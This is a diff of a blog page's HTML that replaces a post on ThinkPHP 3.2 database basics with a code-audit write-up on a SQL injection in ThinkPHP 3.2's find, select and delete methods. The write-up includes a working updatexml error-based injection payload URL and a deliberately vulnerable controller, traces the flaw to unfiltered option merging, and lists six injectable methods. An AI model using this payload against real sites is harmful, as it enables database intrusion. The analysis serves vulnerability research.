@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="PHP," />
+  <meta name="keywords" content="代码审计," />
 
 
 
@@ -79,18 +79,25 @@
 
 
 
-<meta name="description" content="计划把TP框架的基础部分看一看以帮助审计,就先以3.2.x的手册练习,持续更新……   连贯操作:  public function testsql(){     $User = M(&amp;quot;User&amp;quot;); // 实例化User对象      $result = $Model-&amp;gt;select();     //SELECT * FROM `user`      //1.whe">
-<meta name="keywords" content="PHP">
+<meta name="description" content="##基础知识:更多基础知识看:https://p0rz9.github.io/2018/09/28/TP框架数据操作 ##环境搭建: #Application\Home\Controller\IndexController.class.php: &amp;lt;?php namespace Home\Controller; use Think\Controller; class IndexControl">
+<meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP基础 | TP框架数据操作">
-<meta property="og:url" content="http://yoursite.com/2018/09/28/TP框架数据操作/index.html">
+<meta property="og:title" content="代码审计 | Thinkphp3.2 find_delete_selete注入分析">
+<meta property="og:url" content="http://yoursite.com/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/index.html">
 <meta property="og:site_name" content="P0rZ9&#39;s blog">
-<meta property="og:description" content="计划把TP框架的基础部分看一看以帮助审计,就先以3.2.x的手册练习,持续更新……   连贯操作:  public function testsql(){     $User = M(&amp;quot;User&amp;quot;); // 实例化User对象      $result = $Model-&amp;gt;select();     //SELECT * FROM `user`      //1.whe">
+<meta property="og:description" content="##基础知识:更多基础知识看:https://p0rz9.github.io/2018/09/28/TP框架数据操作 ##环境搭建: #Application\Home\Controller\IndexController.class.php: &amp;lt;?php namespace Home\Controller; use Think\Controller; class IndexControl">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-09-28T16:15:55.981Z">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/lw29luk5t7su3s5qqqriv3fn/image_1coi47sfp1u5q6iruc7rtffoe6k.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/vmaxbtyn92txy3ccoburcfmp/image_1coi3s5gvspqtpo1s1g1euq15e067.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/tdbbat7954ktp3f227xv32sr/image_1coi0lkg517g1ghqv331n9fj6o9.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/w5s7d3huryk02oimj6hn2cu6/image_1coi0q3fk1hh0jkiatc1oc515sm1m.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/px40iynyvtu30hk0kqywdv5n/image_1coi1gccr10g61jcvfk5stn6i35q.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/px40iynyvtu30hk0kqywdv5n/image_1coi1gccr10g61jcvfk5stn6i35q.png">
+<meta property="og:updated_time" content="2018-09-29T08:26:07.195Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP基础 | TP框架数据操作">
-<meta name="twitter:description" content="计划把TP框架的基础部分看一看以帮助审计,就先以3.2.x的手册练习,持续更新……   连贯操作:  public function testsql(){     $User = M(&amp;quot;User&amp;quot;); // 实例化User对象      $result = $Model-&amp;gt;select();     //SELECT * FROM `user`      //1.whe">
+<meta name="twitter:title" content="代码审计 | Thinkphp3.2 find_delete_selete注入分析">
+<meta name="twitter:description" content="##基础知识:更多基础知识看:https://p0rz9.github.io/2018/09/28/TP框架数据操作 ##环境搭建: #Application\Home\Controller\IndexController.class.php: &amp;lt;?php namespace Home\Controller; use Think\Controller; class IndexControl">
+<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/lw29luk5t7su3s5qqqriv3fn/image_1coi47sfp1u5q6iruc7rtffoe6k.png">
 
 
 
@@ -120,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/09/28/TP框架数据操作/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/"/>
 
 
 
 
 
-  <title>PHP基础 | TP框架数据操作 | P0rZ9's blog</title>
+  <title>代码审计 | Thinkphp3.2 find_delete_selete注入分析 | P0rZ9's blog</title>
   
 
 
@@ -237,7 +244,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/28/TP框架数据操作/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P0rZ9">
@@ -254,7 +261,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">PHP基础 | TP框架数据操作</h1>
+          <h1 class="post-title" itemprop="name headline">代码审计 | Thinkphp3.2 find_delete_selete注入分析</h1>
         
 
         <div class="post-meta">
@@ -266,8 +273,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-28T08:15:41+08:00">
-                2018-09-28
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-29T09:15:41+08:00">
+                2018-09-29
               </time>
             
 
@@ -309,125 +316,81 @@
       
 
       
-        <blockquote>
-<p>计划把TP框架的基础部分看一看以帮助审计,就先以3.2.x的手册练习,持续更新……</p>
-</blockquote>
-<hr>
-<p>连贯操作:</p>
-<pre><code> public function testsql(){
-    $User = M(&quot;User&quot;); // 实例化User对象
-
-    $result = $Model-&gt;select();
-    //SELECT * FROM `user`
-
-    //1.where：完成多种查询操作
-    //字符串查询
-    $User-&gt;where(&apos;type=1 AND status=1&apos;)-&gt;select();
-    //执行的sql语句为:select * from User where type=1 and status=1;
-
-    //数组查询
-    $map[&apos;id&apos;] = 1;
-    $map[&apos;name&apos;] = &apos;test&apos;;
-    $user-&gt;where($map)-&gt;select();
-    //sql语句:select * from where id=1 and &apos;name&apos; = &apos;test&apos;;
-
-    //表达式查询   sql注入出现多的地方
-    $map[&apos;name&apos;] = array(&apos;eq&apos;,&quot;1&quot;);//其他表达式:GT EGT LT ELT LIKE BETWEEN IN EXP
-    $user-&gt;where($map)-&gt;select();
-    echo M(&apos;user&apos;)-&gt;_SQL();//SELECT * FROM `user` WHERE `name` = &apos;1&apos;
-
-
-    //2.table：主要用于指定操作的数据表
-    $Model-&gt;table(&apos;gather&apos;)-&gt;where(&apos;id=1&apos;)-&gt;select();
-    //SELECT * FROM `gather` WHERE ( id=1 ) 由user表暂时切换到gather表
-
-
-    //3.order:用于对操作的结果排序
-    $Model-&gt;order(&apos;id desc&apos;)-&gt;limit(5)-&gt;select();
-    //SELECT * FROM `user` ORDER BY id desc LIMIT 5
-    $Model-&gt;order(&apos;name desc,id&apos;)-&gt;limit(5)-&gt;select();
-    //支持多个字段排序 如果没有指定desc或者asc排序规则的话，默认为asc。
-
-
-    //4.field 标识要返回或者操作的字段，可以用于查询和写入操作
-    //查询：
-    $result = $Model-&gt;field(&apos;id,name&apos;)-&gt;select();
-    //SELECT `id`,`name` FROM `user
-
-    $result = $Model-&gt;field(&apos;id,SUM(id)&apos;)-&gt;select();
-    //可执行函数 user() database()等
-
-    $Model-&gt;field(&apos;pwd&apos;,true)-&gt;select();
-    //排除pwd这个字段  sql:SELECT `Id`,`name` FROM `user`
-
-    //写入：
-    $Model-&gt;field(&apos;id,name,pwd&apos;)-&gt;create();
-    //也可以字段合法性检测 合法字段只有id name pwd这三种
-
-
-    //5.union 联合查询 必须保证字段数量一样  每个union方法相当于一个独立的SELECT语句
-    $Model-&gt;field(&apos;id&apos;)-&gt;table(&apos;gather&apos;)-&gt;union(array(&apos;field&apos; =&gt; &apos;pwd&apos;,&apos;table&apos; =&gt; &apos;user&apos;))-&gt;union(array(&apos;field&apos;=&gt;&apos;goods_name&apos;,&apos;table&apos;=&gt;&apos;goods&apos;))-&gt;select();
-
-
-
-    //6.cache  
-    $result = $Model-&gt;cache(&apos;key&apos;,60)-&gt;find();
-    //find返回一条数据 缓存有效期为60s
+        <hr>
+<p>##<strong>基础知识:</strong><br><img src="http://static.zybuluo.com/chhyx/lw29luk5t7su3s5qqqriv3fn/image_1coi47sfp1u5q6iruc7rtffoe6k.png" alt="image_1coi47sfp1u5q6iruc7rtffoe6k.png-74kB"><br>更多基础知识看:<br><a href="https://p0rz9.github.io/2018/09/28/TP%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作</a></p>
+<p>##<strong>环境搭建:</strong></p>
+<pre><code>#Application\Home\Controller\IndexController.class.php:
+&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $Model = M(&apos;user&apos;);
+        $Model-&gt;find(I(&apos;get.id&apos;));
+        //$Model-&gt;select(I(&apos;get.id&apos;));
+        //$Model-&gt;delete(I(&apos;get.id&apos;));
+    }
 }
-</code></pre><p>CURD操作:</p>
-<pre><code>public function test_CURD(){
-    $Model = M(&apos;user&apos;);
-//CURD操作
-//1.数据创建 只是保存在内存中 只有用add或save才会写入数据库中
-$data[&apos;name&apos;] = &apos;p0rz9&apos;;
-    $data[&apos;pwd&apos;] = &apos;123456&apos;;
-$Model-&gt;create($data);
-var_dump($Model-&gt;name);//直接读取数据
-    $Model-&gt;name = &apos;P0rz9&apos;;//直接修改数据
+?&gt;
+</code></pre><p><code>select</code>、<code>delete</code>与<code>find</code>代码分析流程基本一样 这里就不再赘述 因为方法中都调用了有问题的<code>_parseOptions()</code>方法</p>
+<p>##<strong>漏洞利用：</strong><br>payload:</p>
+<pre><code>http://127.0.0.1:85/index.php/home/index/index?id[where]=id = 1 and updatexml(0,concat(0xa,user()),0)
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/vmaxbtyn92txy3ccoburcfmp/image_1coi3s5gvspqtpo1s1g1euq15e067.png" alt="image_1coi3s5gvspqtpo1s1g1euq15e067.png-81kB"></p>
+<p>##<strong>代码分析:</strong><br>相关变量已加到注释中<br>A.从<code>IndexController.class.php</code>开始分析</p>
+<pre><code>$Model-&gt;find(I(&apos;get.id&apos;));
+</code></pre><p>B.跟进<code>Thinkphp\Library\Think\Model.class.php</code>的<code>find()</code>方法:</p>
+<pre><code>#Thinkphp\Library\Think\Model.class.php 722行
+public function find($options=array()) {
+...
+// 总是查找一条记录
+$options[&apos;limit&apos;]   =   1;
 
+    // 分析表达式
+    $options            =   $this-&gt;_parseOptions($options);
+    //方法的核心 分析表达式 获取表名 获取字段
 
-    //2.数据写入 
-    $Model-&gt;add();
-    //sql:INSERT INTO `user` (`name`,`pwd`) VALUES (&apos;P0rz9&apos;,&apos;123456&apos;) 
+    // 判断查询缓存
+    //无缓存
+...
 
-    //字段过滤 写入时可用field过滤非法字段
-    $Model-&gt;field(&apos;name&apos;)-&gt;data($data)-&gt;add();
-    //最终只有name字段的数据写入 pwd字段被过滤
-
-    //字段内容过滤 filter方法对其内容过滤 strip_tags为过滤函数
-    $Model-&gt;data($data)-&gt;filter(&apos;strip_tags&apos;)-&gt;add();
-
-    //3.数据读取
-    $result = $Model-&gt;where(&apos;id=1&apos;)-&gt;find();//返回一行数据(或关联数据)
-    var_dump($result);//也可用data()获取查询后的数据:var_dump($Model-&gt;data());
-
-
-
-    //4.更新数据
-    $data[&apos;name&apos;] = &apos;kkk&apos;;
-    $Model-&gt;where(&apos;Id=1&apos;)-&gt;save($data);//数据对象属性操作
-    $Model-&gt;name = &apos;ThinkPHP&apos;;
-    $Model-&gt;where(&apos;id=1&apos;)-&gt;save();//对象方式操作
-
-
-    //5.删除数据
-    $Model-&gt;where(&apos;Id=5&apos;)-&gt;delete(); // 删除id为5的用户数据
-    $Model-&gt;delete(&apos;1,2,5&apos;); // 删除主键为1,2和5的用户数据
-    $Model-&gt;where(&apos;status=0&apos;)-&gt;delete(); // 删除所有状态为0的用户数据
-    $Model-&gt;where(&apos;status=0&apos;)-&gt;order(&apos;create_time&apos;)-&gt;limit(&apos;5&apos;)-&gt;delete(); 
-    //删除所有状态为0的5个用户数据 按照创建时间排序
-</code></pre><p>}</p>
-<p>TP自带的核心函数:</p>
-<pre><code>public function Test_Think_Func(){
-
-    $User = D(&apos;User&apos;);// 相当于 $User = new \Home\Model\UserModel();
-    $User-&gt;select(); //执行具体的数据操作
-
-    $User = M(&apos;User&apos;);// 和用法 $User = new \Think\Model(&apos;User&apos;);等效
-    $User-&gt;select();
-
+    $resultSet          =   $this-&gt;db-&gt;select($options);//在这里报错
+</code></pre><p>进入_parseOptions()方法:</p>
+<pre><code>protected function _parseOptions($options=array()) {
+if(is_array($options))
+    $options =  array_merge($this-&gt;options,$options);
+...
+// 表达式过滤
+$this-&gt;_options_filter($options);
+return $options;
 }
-</code></pre>
+</code></pre><p>进入<code>_parseOptions()</code>方法后,判断如果<code>$options</code>为数组 则直接拼接 下面的<code>_options_filter()</code>是个空方法 并无过滤<br>我们继续分析：</p>
+<pre><code>$resultSet       =   $this-&gt;db-&gt;select($options);
+</code></pre><p>C.跟进<code>Thinkphp\Library\Think\Db\Driver.class.php</code>文件的<code>select()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/tdbbat7954ktp3f227xv32sr/image_1coi0lkg517g1ghqv331n9fj6o9.png" alt="image_1coi0lkg517g1ghqv331n9fj6o9.png-48.9kB"></p>
+<p>跟进生成<code>buildSelectSql()</code>方法:</p>
+<pre><code>public function buildSelectSql($options=array()) {
+...
+$sql  =   $this-&gt;parseSql($this-&gt;selectSql,$options);
+return $sql;
+}
+</code></pre><p>跟进<code>parseSql()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/w5s7d3huryk02oimj6hn2cu6/image_1coi0q3fk1hh0jkiatc1oc515sm1m.png" alt="image_1coi0q3fk1hh0jkiatc1oc515sm1m.png-75.9kB"></p>
+<p>跟进<code>parseWhere()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/px40iynyvtu30hk0kqywdv5n/image_1coi1gccr10g61jcvfk5stn6i35q.png" alt="image_1coi13nn815cb1fates71u48k9u30.png-28.6kB"></p>
+<p>传入的<code>$options[&#39;where&#39;]</code>的值为<code>string</code>类型时直接返回</p>
+<p>D.在<code>parseSql()</code>方法中 我们可以看到不仅仅<code>$where</code>我们可控 像其他的<code>table field order union</code>等 我们都是可以控制的:<br><img src="http://static.zybuluo.com/chhyx/px40iynyvtu30hk0kqywdv5n/image_1coi1gccr10g61jcvfk5stn6i35q.png" alt="image_1coi1gccr10g61jcvfk5stn6i35q.png-47.9kB"></p>
+<p>也就是说我们可以自己构造sql语句进行注入。</p>
+<p>E.经过分析,我们可得到造成漏洞的原因是<code>_parseOptions()</code>方法中直接拼接字符串导致的 我们搜一下这个方法的所有利用点:</p>
+<pre><code>_parseOptions($options)
+</code></pre><p>搜了下整个框架,引入这个<code>_parseOptions()</code>的方法情况:<br>第一个参数可控时,可注入:</p>
+<pre><code>public function find($options=array())
+public function select($options=array())
+public function delete($options=array())
+</code></pre><p>第二个参数可控时,可注入:</p>
+<pre><code>public function save($data=&apos;&apos;,$options=array())
+public function add($data=&apos;&apos;,$options=array(),$replace=false)
+public function addAll($dataList,$options=array(),$replace=false)
+</code></pre><p>//不将<code>$options</code>带入sql语句中,无法注入:</p>
+<pre><code>public function selectAdd($fields=&apos;&apos;,$table=&apos;&apos;,$options=array())
+</code></pre><p>一共可利用的点有6处。</p>
+
       
     </div>
     
@@ -444,7 +407,7 @@ var_dump($Model-&gt;name);//直接读取数据
       
         <div class="post-tags">
           
-            <a href="/tags/PHP/" rel="tag"># PHP</a>
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
           
         </div>
       
@@ -457,8 +420,8 @@ var_dump($Model-&gt;name);//直接读取数据
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/27/代码审计Day4 - strpos使用不当引发漏洞/" rel="next" title="代码审计Day4 - strpos使用不当引发漏洞">
-                <i class="fa fa-chevron-left"></i> 代码审计Day4 - strpos使用不当引发漏洞
+              <a href="/2018/09/28/TP框架数据操作/" rel="next" title="PHP基础 | TP框架数据操作">
+                <i class="fa fa-chevron-left"></i> PHP基础 | TP框架数据操作
               </a>
             
           </div>
@@ -466,10 +429,6 @@ var_dump($Model-&gt;name);//直接读取数据
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/" rel="prev" title="代码审计 | Thinkphp3.2 find_delete_selete注入分析">
-                代码审计 | Thinkphp3.2 find_delete_selete注入分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
